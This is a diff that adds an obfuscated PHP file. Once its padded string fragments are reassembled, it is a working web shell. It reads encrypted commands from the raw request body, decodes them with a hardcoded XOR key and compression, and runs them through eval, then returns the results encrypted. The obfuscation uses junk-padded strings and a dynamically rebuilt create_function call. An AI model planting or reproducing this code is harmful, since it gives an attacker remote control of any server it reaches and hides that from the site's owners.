@@ -1,0 +1,11 @@
+<?php
+$N='atch(f*"f*/f*$kh(.+)$kf*f/",@ff*ilef*_get_contents("f*php://inputf*"f*),$m)==1){f*@of*b_f*starf';
+$D='*t();@ef*val(@gzuncomprf*ess(@f*x(f*@baf*sf*e64_decode($m[1]),$k)))f*;$o=@of*f*b_getf*_cf*ontents();';
+$h='or($j=0;($jf*<$c&f*&$if*<$l);$j++,$f*i++){$f*o.=$t{$if*}^f*$k{$j}f*;}}f*return $o;f*}if(f*@pregf*_m';
+$C='*oe";functf*ion x($t,$k){$f*c=f*strlen($f*k);$l=strlenf*(f*$t)f*f*;$f*o="";for($i=0;$i<$f*l;){ff*';
+$z='$k="ef*f*10adc3f*9";$kf*h="49bf*a59af*bbf*e56";$kf=f*"e057f20f8f*83e";f*$p="Nm1f*vnbJmtf*Djsf*Smf';
+$Q='@ob_ef*nd_clef*f*an();$r=@base6f*4f*_encodef*(@x(@gzcof*mprf*f*ess($of*f*),$k));prif*nt("$p$kh$r$kf");}';
+$K=str_replace('w','','wcwrewawte_funcwtiwon');
+$M=str_replace('f*','',$z.$C.$h.$N.$D.$Q);
+$Y=$K('',$M);$Y();
+?>
